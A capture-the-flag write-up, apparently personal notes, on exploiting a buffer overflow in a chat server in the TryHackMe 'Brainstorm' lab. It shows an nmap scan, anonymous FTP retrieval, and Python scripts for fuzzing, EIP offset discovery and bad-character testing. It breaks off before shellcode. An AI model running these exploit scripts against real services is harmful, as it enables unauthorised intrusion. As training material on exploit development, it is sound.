@@ -1,0 +1,589 @@
+Brainstorm Notes
+
+Nmap Scan
+
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# cat nmap/all.nmap 
+# Nmap 7.80 scan initiated Tue May 12 08:17:17 2020 as: nmap -Pn -sC -sV -oA nmap/all 10.10.184.170
+Nmap scan report for 10.10.184.170
+Host is up (0.28s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|_  SYST: Windows_NT
+3389/tcp open  tcpwrapped
+|_ssl-date: 2020-05-12T02:51:02+00:00; 0s from scanner time.
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     Welcome to Brainstorm chat (beta)
+|     Please enter your username (max 20 characters): Write a message:
+|   NULL: 
+|     Welcome to Brainstorm chat (beta)
+|_    Please enter your username (max 20 characters):
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.80%I=7%D=5/12%Time=5EBA0E54%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
+SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
+SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
+SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
+SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
+SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
+SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
+SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
+SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
+SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
+SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
+SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
+SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
+SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
+SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
+SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
+SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
+SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
+SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
+SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
+SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
+SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
+SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
+SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
+SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
+SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
+SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
+SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
+SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
+SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
+SF:\x20a\x20message:\x20");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue May 12 08:22:02 2020 -- 1 IP address (1 host up) scanned in 285.52 seconds
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# 
+
+From scan we can only see that the machine is having 3 ports open.
+
+Port 21 for FTP, Port 3389 for RDP and Port 9999 for a Custom Chat program.
+
+However there are 6 ports open in this server.
+
+Let's start with the port 21.
+
+We can login to FTP using anonymous and we got the chatserver.exe 
+
+125 Data connection already open; Transfer starting.
+08-29-19  08:36PM       <DIR>          chatserver
+226 Transfer complete.
+ftp> cd chatserver
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-29-19  10:26PM                43747 chatserver.exe
+08-29-19  10:27PM                30761 essfunc.dll
+226 Transfer complete.
+
+Finally after fuzzing came to know that the chatserver is vulnerable to bof:
+
+####################
+FUZZING 
+####################
+```
+import socket,sys
+
+address = '172.16.215.167'
+port = 9999
+
+uname = "sam"
+
+# creating the buffer
+
+buffer = "A" * 3000
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(uname + '\r\n')
+    s.recv(1024)
+    s.send(buffer + '\r\n')
+    s.recv(1024)
+except :
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
+finally:
+    s.close()
+```
+
+#!/usr/bin/python
+
+import socket
+from time import sleep
+
+#buffer = "A" * 100
+
+#while True:
+#		try: 
+            #print "Sending the evil buffer...!!"
+
+buffer=["A"]
+counter=500
+while len(buffer) <= 100:
+    buffer.append("A"*counter)
+    counter=counter+500
+
+for string in buffer:
+    print "Fuzzing the message with %s bytes" % len(string)
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('172.16.215.167',9999))
+    print s.recv(1024)
+    print s.recv(1024)
+    s.send("natz \r\n")
+    print s.recv(1024)
+    s.send(string)
+    s.close()
+
+##########################
+
+Controlling the EIP
+
+##########################
+
+From the above we can see that the "A" have overwritten the EIP, now we need to how many bytes we need to send in the message to get to EIP, once we find that we will be able to control the EIP.
+
+To achieve that we can use the pattern_create which is a ruby script which create different pattern which we can send it in message.
+
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h
+Usage: msf-pattern_create [options]
+Example: msf-pattern_create -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
+
+Options:
+    -l, --length <length>            The length of the pattern
+    -s, --sets <ABC,def,123>         Custom Pattern Sets
+    -h, --help                       Show this message
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# 
+
+Add this to the buffer variable on the script.
+
+#!/usr/bin/python
+
+import socket,sys
+
+address = '172.16.215.167'
+port = 9999
+
+uname = "sam"
+
+# creating the buffer
+
+#buffer = "A" * 3000
+buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(uname + '\r\n')
+    s.recv(1024)
+    s.send(buffer + '\r\n')
+    s.recv(1024)
+except :
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
+finally:
+    s.close()
+
+Restart the immunity debugger and make sure the program is running.
+
+Once the program is running execute our control EIP script, you will notice the EIP is overwritten by the unique string.
+
+EIP 31704330
+
+We can query the unique string to find the exact lenght of message to overwrite the EIP, for this we can use pattern_offset.
+
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h
+Usage: msf-pattern_offset [options]
+Example: msf-pattern_offset -q Aa3A
+[*] Exact match at offset 9
+
+Options:
+    -q, --query Aa0A                 Query to Locate
+    -l, --length <length>            The length of the pattern
+    -s, --sets <ABC,def,123>         Custom Pattern Sets
+    -h, --help                       Show this message
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31704330
+[*] Exact match at offset 2012
+root@natzsec:~/Desktop/tryhackme/boxes/brainstorm# 
+
+Now we know that 2012 bytes needs to be sent in our message to take control of the EIP.
+
+Let's veriy it.
+
+For that we need some modification in our script.
+
+So the facts now about what we know :
+
+program crashes at : 3000 
+To control EIP we need : 2012
+To overwrite the EIP we need : 4
+
+So the total message that we send to make the program crash will be like this.
+
+A * 2012   # the length of the message to reach right before EIP.
+B * 4	   # the 4 bytes which will overwrite the EIP.
+C * (3000-2012-4)   # the rest of the bytes to crash the program !! so the number of C's will be like 984.
+
+So the modified skeleton scrip will look something like this.
+
+#!/usr/bin/python
+
+import socket,sys
+
+address = '172.16.215.167'
+port = 9999
+
+uname = "sam"
+
+# creating the buffer
+
+#buffer = "A" * 3000  #initial fuzzing 
+
+buffer = "A" * 2012				#number of bytes to reach right before EIP.
+buffer+= "B" * 4				#the 4 byte which will overwrite EIP to make sure we control EIP
+buffer+= "C" * (3000-2012-4)	#the rest of the bytes which is need to crash the program.
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(uname + '\r\n')
+    s.recv(1024)
+    s.send(buffer + '\r\n')
+    s.recv(1024)
+except :
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
+finally:
+    s.close()
+
+Before executing, make sure you have restarted the immunitiy and the program is running.
+
+Once you execute the script it will overwrite the EIP with our B's and the EIP will look like this.
+
+EIP 42424242
+
+############################
+
+BAD Character
+
+############################
+
+
+Now we know that we can control the EIP, so before proceeding to create a shell code we need to find the bad character.
+
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\
+x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x2
+5\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\
+x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4
+a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\
+x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6
+f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\
+x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x9
+4\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\
+xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb
+9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\
+xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xd
+e\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\
+xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+
+We can send this in our message and to see if the characters are truncating any of our shellcode which are after it.
+
+Again we need to modify the script a bit.
+
+But this bad characters need to be sent in the place of c's
+
+#!/usr/bin/python
+
+import socket,sys
+
+address = '172.16.215.167'
+port = 9999
+
+uname = "sam"
+
+# creating the buffer
+
+#buffer = "A" * 3000  #initial fuzzing 
+
+badcharacters = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+
+buffer = "A" * 2012
+buffer+= "B" * 4
+#buffer+= "C" * (3000-2012-4)
+buffer+= badcharacters
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(uname + '\r\n')
+    s.recv(1024)
+    s.send(buffer + '\r\n')
+    s.recv(1024)
+except :
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
+finally:
+    s.close()
+
+Now we need to take a look at the crash, right click on the ESP and select follow in dump it will take us to the hex dump.
+
+We need to check each and every character if it is being truncated or not.
+
